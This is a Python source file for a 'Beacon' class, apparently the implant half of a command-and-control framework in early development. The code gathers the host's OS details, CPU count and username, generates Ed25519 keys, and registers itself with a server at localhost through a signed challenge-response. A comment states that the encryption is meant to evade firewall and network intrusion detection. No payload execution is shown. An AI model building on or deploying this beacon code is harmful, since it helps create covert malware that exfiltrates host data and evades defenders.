import json
import uuid
import os
import urllib3
import base64

# Encryption libraries to prevent Firewall and NDS Detection
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


class Beacon:

    BASE_SERVER_URL = "http://127.0.0.1:4999"

    @classmethod
    def generate_beacon_fingerprint(cls):
        os_info = os.uname()
        os_cpu_count = os.cpu_count()
        os_user = os.environ.get("USER") or os.environ.get("USERNAME")

        return {
            "os_info": os_info,
            "os_cpu_count": os_cpu_count,
            "os_user": os_user,
        }

    def __init__(self):
        self.beacon_id = uuid.uuid4()
        self.description = "Hello, I am a Beacon."
        self.beacon_fingerprint = self.generate_beacon_fingerprint()

    def generate_key_pairs(self):
        self.private_key = Ed25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()

        self.private_key_hex = self.private_key.private_bytes_raw().hex()
        self.public_key_hex = self.public_key.public_bytes_raw().hex()

    def register_beacon(self):
        initial_registration_request = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/start",
            json=self.beacon_fingerprint,
        )
        json_response = initial_registration_request.json()

        if initial_registration_request.status == 200:
            challenge_id, challenge = (
                json_response["challenge_id"],
                json_response["challenge"],
            )
            challenge_signature = base64.b64encode(self.private_key.sign(base64.b64decode(challenge))).decode('utf-8')

            challenge_response = {
                "beacon_id": str(self.beacon_id),
                "challenge_id": challenge_id,
                "challenge_signature": challenge_signature,
                "public_key": self.public_key_hex,
                "system_info": self.beacon_fingerprint
            }

            challenge_response_request = urllib3.request(
                "POST",
                f"{self.BASE_SERVER_URL}/api/register/verify-challenge-response",
                json=challenge_response,
            )

            print(challenge_response_request.data)


b1 = Beacon()

print(b1.beacon_fingerprint)
b1.generate_key_pairs()

b1.register_beacon()